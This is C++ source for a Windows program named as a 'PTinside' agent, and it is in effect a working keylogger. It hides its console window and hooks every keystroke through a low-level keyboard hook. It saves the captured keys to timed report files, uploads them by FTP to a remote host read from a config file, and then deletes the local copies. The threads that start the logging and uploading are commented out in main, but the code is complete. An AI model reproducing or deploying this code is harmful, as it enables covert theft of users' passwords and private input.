#include<fstream>
#include <iostream>
#include <Windows.h>
#include<winuser.h>
#include <fstream>
#include <wininet.h>
#pragma comment( lib, "wininet" )
#include <ctime>
#include <chrono>
#include <thread>
#include <array>
#include <string>
#include <filesystem>
using namespace std;
string out = "";
string apppath = "C:\\Program Files\\PTinside\\";
HHOOK eHook = NULL;
string exec(const char* cmd) {
	array<char, 128> buffer;
	string result;
	unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe) {
		throw std::runtime_error("popen() failed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	return result;
}
void hide() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	if (wParam == WM_KEYDOWN) {
			out += char(p->vkCode);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
void startKeylogger() {
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyboardHookProc, GetModuleHandle(NULL), 0);
}
void saveReport() {
	while (1) {
		this_thread::sleep_for(15s);
		if (out != "") {
			cout << "Saving report file: " + apppath + "reports\\" + to_string(time(0)) + ".html" << endl;
			ofstream reportfile;
			reportfile.open(apppath + "reports\\" + to_string(time(0)) + ".html");
			reportfile << out;
			reportfile.close();
			out = "";
			cout << "Saved!" << endl;
		}
	}
}
void sendReport() {
	ifstream configfile;
	configfile.open(apppath+"config.txt");
	string host,user,pass;
	getline(configfile, host);
	getline(configfile, user);
	getline(configfile, pass);
	configfile.close();
	wstring whost = wstring(host.begin(), host.end());
	wstring wuser = wstring(user.begin(), user.end());
	wstring wpass = wstring(pass.begin(), pass.end());
	while (1) {
		this_thread::sleep_for(35s);
		cout << "Sending report..." << endl;
		string path = apppath+"reports";
		for (const auto& entry : directory_iterator(path)) {
			cout << entry.path() << endl;
			HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
			HINTERNET hFtpSession = InternetConnect(hInternet, whost.c_str(), INTERNET_DEFAULT_FTP_PORT, wuser.c_str(), wpass.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
			string rpath = ("PTlogs/" + entry.path().filename().string());
			wstring wrpath = wstring(rpath.begin(), rpath.end());
			FtpPutFile(hFtpSession, entry.path().c_str(), wrpath.c_str() , FTP_TRANSFER_TYPE_BINARY, 0);
			InternetCloseHandle(hFtpSession);
			InternetCloseHandle(hInternet);
			cout << "File Uploaded: "+ ("PTlogs/" + entry.path().filename().string()) << endl;
			string delcmd = "del \"" + entry.path().string()+"\"";
			system(delcmd.c_str());
		}
	}
}
int main()
{
	hide();
	MSG Msg;
	cout << "Agent started..." << endl;
	/*startKeylogger();
	cout << "Keylogger started..."<<endl;
	thread dumper(saveReport);
	thread sender(sendReport);*/
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return 0;
}
